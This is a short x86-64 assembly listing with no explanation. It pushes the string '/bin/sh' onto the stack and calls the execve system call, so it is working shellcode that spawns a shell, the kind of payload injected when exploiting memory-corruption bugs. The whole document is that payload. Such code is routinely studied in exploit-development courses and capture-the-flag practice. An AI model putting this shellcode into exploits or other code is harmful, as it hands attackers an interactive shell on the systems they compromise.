[BITS 64]
mov rax, 0x68732f6e69622f
push rax
push rsp 
pop rdi
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall 